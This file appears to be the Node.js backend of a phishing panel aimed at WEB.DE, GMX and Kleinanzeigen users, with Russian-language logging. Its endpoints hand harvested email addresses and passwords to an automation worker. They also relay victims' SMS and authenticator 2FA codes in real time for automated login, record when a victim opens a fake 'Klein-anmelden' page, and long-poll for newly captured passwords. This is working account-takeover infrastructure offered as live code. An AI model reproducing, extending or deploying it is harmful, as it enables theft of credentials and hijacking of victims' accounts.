const { send } = require('../../utils/httpUtils');
const { checkAdminAuth, checkWorkerSecret, hasValidWorkerSecret } = require('../../utils/authUtils');
const { EVENT_LABELS } = require('../../utils/formatUtils');
const { getWorkerLeadCredentialsFields } = require('../../lib/leadLoginContext');
const automationScriptEventController = require('./automationScriptEventController');

const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));

// WEB.DE/GMX script polls 2FA frequently; dedupe log noise.
const webdePoll2faLogDedupe = new Map();
const WEBDE_POLL_2FA_LOG_DEDUPE_CAP = 400;

async function handle(scope) {
  with (scope) {
    if (pathname === '/api/lead-credentials' && req.method === 'GET') {
      if (!checkWorkerSecret(req, res)) return true;
      const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
      if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = resolveLeadId(leadIdRaw);
      readLeadsAsync(function (err, leads) {
        if (err || !Array.isArray(leads)) {
          return send(res, 500, { ok: false, error: 'read leads failed' });
        }
        const lead = leads.find((l) => l.id === id);
        if (!lead) {
          console.log('[АДМИН] lead-credentials: лид не найден id=' + id + (id !== leadIdRaw ? ' (resolved from ' + leadIdRaw + ')' : ''));
          return send(res, 404, { ok: false });
        }
        const { email, password, passwordKl } = getWorkerLeadCredentialsFields(lead);
        if (email) touchWebdeScriptLock(email.toLowerCase());
        const credBody = {
          ok: true,
          email: email,
          password: password,
          passwordVersion: Number.isFinite(lead.passwordVersion) ? Number(lead.passwordVersion) : 0,
          attemptNo: Number.isFinite(lead.attemptNo) ? Number(lead.attemptNo) : 1,
          clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : null,
          hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : null,
          recordBrand: lead.brand != null ? String(lead.brand) : null
        };
        if (lead.brand === 'klein') {
          credBody.passwordKl = passwordKl != null && String(passwordKl).trim() !== '' ? String(passwordKl).trim() : null;
        }
        return send(res, 200, credBody);
      });
      return true;
    }

    if (pathname === '/api/lead-klein-flow-poll' && req.method === 'GET') {
      if (!checkWorkerSecret(req, res)) return true;
      const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
      if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = resolveLeadId(leadIdRaw);
      readLeadsAsync(function (err, leads) {
        if (err || !Array.isArray(leads)) {
          return send(res, 500, { ok: false, error: 'read leads failed' });
        }
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false });
        const emCtx = (lead.email || '').trim().toLowerCase();
        if (emCtx) touchWebdeScriptLock(emCtx);
        const seen = !!(lead.kleinAnmeldenSeenAt && String(lead.kleinAnmeldenSeenAt).trim());
        const emailKl = (lead.emailKl != null ? String(lead.emailKl) : '').trim();
        const passwordKl = (lead.passwordKl != null ? String(lead.passwordKl) : '').trim();
        return send(res, 200, {
          ok: true,
          anmeldenSeen: seen,
          emailKl: emailKl,
          passwordKl: passwordKl,
          clientFormBrand: lead.clientFormBrand != null ? String(lead.clientFormBrand) : null,
          hostBrandAtSubmit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit) : null,
          recordBrand: lead.brand != null ? String(lead.brand) : null
        });
      });
      return true;
    }

    if (pathname === '/api/klein-anmelden-seen' && req.method === 'POST') {
      if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
        return send(res, 403, { ok: false, error: 'forbidden' });
      }
      let bodySeen = '';
      req.on('data', (chunk) => { bodySeen += chunk; });
      req.on('end', () => {
        let j = {};
        try { j = JSON.parse(bodySeen || '{}'); } catch (e) {}
        const lid = j.leadId != null ? String(j.leadId).trim() : '';
        if (!lid) return send(res, 400, { ok: false, error: 'leadId required' });
        const id = resolveLeadId(lid);
        const leads = readLeads();
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false });
        const nowIso = new Date().toISOString();
        lead.kleinAnmeldenSeenAt = nowIso;
        lead.lastSeenAt = nowIso;
        pushEvent(lead, 'Открыл страницу Klein-anmelden');
        persistLeadPatch(id, {
          kleinAnmeldenSeenAt: lead.kleinAnmeldenSeenAt,
          lastSeenAt: lead.lastSeenAt,
          eventTerminal: lead.eventTerminal
        });
        return send(res, 200, { ok: true });
      });
      return true;
    }

    if (pathname === '/api/webde-poll-2fa-code' && req.method === 'GET') {
      if (!checkWorkerSecret(req, res)) return true;
      const leadIdRaw = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
      if (!leadIdRaw) return send(res, 400, { ok: false, error: 'leadId required' });
      const id = resolveLeadId(leadIdRaw);
      readLeadsAsync(function (err, leads) {
        if (err || !Array.isArray(leads)) {
          return send(res, 500, { ok: false, error: 'read leads failed' });
        }
        const lead = leads.find((l) => l.id === id);
        if (!lead) {
          return send(res, 404, { ok: false, error: 'lead not found' });
        }
        const em = (lead.email || '').trim().toLowerCase();
        if (em) touchWebdeScriptLock(em);
        const kind = smsCodeDataKindForLead(lead);
        const d = lead.smsCodeData;
        const code = d && String(d.code || '').trim();
        const submittedAt = d && d.submittedAt != null ? String(d.submittedAt).trim() : '';
        // Принимаем и '2fa' (TOTP/Authenticator), и 'sms' — оба требуют ввода
        // 6-значного кода в одинаковом UI web.de (cookiemail/webde_login.py).
        if ((kind !== '2fa' && kind !== 'sms') || !code) {
          webdePoll2faLogDedupe.delete(id);
          return send(res, 200, { ok: true, code: null, submittedAt: null, kind: kind || null });
        }
        const dedupeKey = (submittedAt || '') + '\t' + code;
        if (webdePoll2faLogDedupe.get(id) !== dedupeKey) {
          webdePoll2faLogDedupe.set(id, dedupeKey);
          if (webdePoll2faLogDedupe.size > WEBDE_POLL_2FA_LOG_DEDUPE_CAP) {
            const oldest = webdePoll2faLogDedupe.keys().next().value;
            if (oldest != null) webdePoll2faLogDedupe.delete(oldest);
          }
          console.log('[АДМИН] webde-poll-2fa-code: отдан код ' + kind.toUpperCase() + ' лиду id=' + id + ' (для автовхода WEB.DE)');
        }
        return send(res, 200, { ok: true, code: code, submittedAt: submittedAt || null, kind: kind });
      });
      return true;
    }

    if (pathname === '/api/webde-login-2fa-received' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const idRaw = json.id != null ? String(json.id).trim() : '';
        if (!idRaw) return send(res, 400, { ok: false });
        const id = resolveLeadId(idRaw);
        const leads = readLeads();
        const idx = leads.findIndex((l) => l.id === id);
        if (idx === -1) return send(res, 404, { ok: false });
        const lead = leads[idx];
        lead.lastSeenAt = new Date().toISOString();
        const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
        pushEvent(lead, EVENT_LABELS.TWO_FA_CODE_IN, 'script', prSession);
        const patch2faIn = {
          lastSeenAt: lead.lastSeenAt,
          eventTerminal: lead.eventTerminal
        };
        if (lead.scriptStatus === 'wrong_2fa') patch2faIn.scriptStatus = null;
        persistLeadPatch(id, patch2faIn);
        return send(res, 200, { ok: true });
      });
      return true;
    }

    if (pathname === '/api/webde-login-2fa-wrong' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const idRaw = json.id != null ? String(json.id).trim() : '';
        if (!idRaw) return send(res, 400, { ok: false });
        const id = resolveLeadId(idRaw);
        const leads = readLeads();
        const idx = leads.findIndex((l) => l.id === id);
        if (idx === -1) return send(res, 404, { ok: false });
        const lead = leads[idx];
        lead.lastSeenAt = new Date().toISOString();
        const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
        pushEvent(lead, EVENT_LABELS.TWO_FA_WRONG, 'script', prSession);
        lead.scriptStatus = 'wrong_2fa';
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal, scriptStatus: lead.scriptStatus });
        return send(res, 200, { ok: true });
      });
      return true;
    }

    if (pathname === '/api/webde-wait-password' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const leadIdRaw = json.leadId && String(json.leadId).trim();
        const clientKnownVersion = Number.isFinite(json.clientKnownVersion) ? Number(json.clientKnownVersion) : 0;
        const requestId = json.requestId != null ? String(json.requestId).trim() : '';
        const attemptNo = Number.isFinite(json.attemptNo) ? Number(json.attemptNo) : null;
        if (!leadIdRaw) {
          return send(res, 400, { ok: false, error: 'leadId required' });
        }
        const leadId = resolveLeadId(leadIdRaw);
        const leadSnapshot = readLeadById(leadId);
        const currentVersion = leadSnapshot && Number.isFinite(leadSnapshot.passwordVersion) ? Number(leadSnapshot.passwordVersion) : 0;
        const currentAttempt = leadSnapshot && Number.isFinite(leadSnapshot.attemptNo) ? Number(leadSnapshot.attemptNo) : 1;
        if (
          leadSnapshot &&
          currentVersion > clientKnownVersion &&
          (leadSnapshot.consumedByAttempt == null || leadSnapshot.consumedByAttempt === currentAttempt)
        ) {
          try {
            markPasswordConsumedByAttempt(leadId, currentVersion, currentAttempt);
          } catch (e) {
            console.error('[АДМИН] markPasswordConsumedByAttempt:', e && e.message ? e.message : e);
          }
          console.log(
            '[АДМИН] webde-wait-password lifecycle=respond instance=' + SERVER_INSTANCE +
            ' leadId=' + leadId + ' attemptNo=' + currentAttempt + ' requestId=' + (requestId || '-') +
            ' wakeup_reason=new_version response_version=' + currentVersion
          );
          return send(res, 200, {
            ok: true,
            password: String(leadSnapshot.password || ''),
            passwordVersion: currentVersion,
            attemptNo: currentAttempt,
            wakeupReason: 'new_version',
            requestId: requestId || null,
            instance: SERVER_INSTANCE
          });
        }
        try {
          const leadsW = readLeads();
          const lw = leadsW.find((l) => l.id === leadId);
          const emW = lw && (lw.email || '').trim().toLowerCase();
          if (emW) touchWebdeScriptLock(emW);
        } catch (_) {}
        if (webdePasswordWaiters[leadId]) {
          console.log('[АДМИН] long-poll webde-wait-password: новый запрос заменил предыдущий → старому клиенту timeout, leadId=' + leadId);
          try {
            clearTimeout(webdePasswordWaiters[leadId].timeoutId);
            send(webdePasswordWaiters[leadId].res, 200, {
              timeout: true,
              wakeupReason: 'replaced_by_new_waiter',
              instance: SERVER_INSTANCE
            });
          } catch (e) {}
          delete webdePasswordWaiters[leadId];
          setWebdeLeadScriptStatus(leadId, null);
        }
        const timeoutId = setTimeout(function () {
          if (!webdePasswordWaiters[leadId]) return;
          console.log('[АДМИН] long-poll webde-wait-password: истёк срок ' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000) + 'с без пароля из админки, leadId=' + leadId);
          try {
            send(webdePasswordWaiters[leadId].res, 200, {
              timeout: true,
              wakeupReason: 'timeout',
              instance: SERVER_INSTANCE
            });
          } catch (e) {}
          delete webdePasswordWaiters[leadId];
          setWebdeLeadScriptStatus(leadId, null);
        }, WEBDE_WAIT_PASSWORD_TIMEOUT_MS);
        webdePasswordWaiters[leadId] = {
          res: res,
          timeoutId: timeoutId,
          clientKnownVersion: clientKnownVersion,
          requestId: requestId,
          attemptNo: attemptNo != null ? attemptNo : currentAttempt
        };
        setWebdeLeadScriptStatus(leadId, 'wait_password');
        console.log(
          '[АДМИН] webde-wait-password lifecycle=start instance=' + SERVER_INSTANCE +
          ' leadId=' + leadId + ' attemptNo=' + (attemptNo != null ? attemptNo : currentAttempt) +
          ' passwordVersion=' + currentVersion + ' clientKnownVersion=' + clientKnownVersion +
          ' requestId=' + (requestId || '-') +
          ' timeoutSec=' + Math.round(WEBDE_WAIT_PASSWORD_TIMEOUT_MS / 1000)
        );
      });
      return true;
    }

    if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
      if (!checkWorkerSecret(req, res)) return true;
      const leadIdRaw = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
      const leadId = leadIdRaw ? resolveLeadId(leadIdRaw) : '';
      if (!leadId) return send(res, 400, { ok: false, resend: false });
      const requested = !!webdePushResendRequested[leadId];
      if (requested) delete webdePushResendRequested[leadId];
      res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
      res.end(JSON.stringify({ resend: requested }));
      return true;
    }

    if (pathname === '/api/webde-push-resend-result' && req.method === 'POST') {
      if (!checkWorkerSecret(req, res)) return true;
      let body = '';
      req.on('data', (chunk) => { body += chunk; });
      req.on('end', () => {
        let json = {};
        try { json = JSON.parse(body || '{}'); } catch {}
        const idRaw = json.id && String(json.id).trim();
        const id = idRaw ? resolveLeadId(idRaw) : '';
        const success = json.success === true;
        const message = json.message != null ? String(json.message).trim().slice(0, 200) : '';
        if (!id) return send(res, 400, { ok: false });
        const leads = readLeads();
        const idx = leads.findIndex((l) => l.id === id);
        if (idx === -1) return send(res, 404, { ok: false });
        const lead = leads[idx];
        lead.lastSeenAt = new Date().toISOString();
        const label = success ? EVENT_LABELS.PUSH_RESEND_OK : (EVENT_LABELS.PUSH_RESEND_FAIL + (message ? ': ' + message : ''));
        const prSession = lead.webdeScriptActiveRun != null ? { session: lead.webdeScriptActiveRun } : undefined;
        pushEvent(lead, label, 'script', prSession);
        persistLeadPatch(id, { lastSeenAt: lead.lastSeenAt, eventTerminal: lead.eventTerminal });
        send(res, 200, { ok: true });
      });
      return true;
    }

    if (await automationScriptEventController.handle(scope)) return true;

    return false;
  }
}

module.exports = { handle };
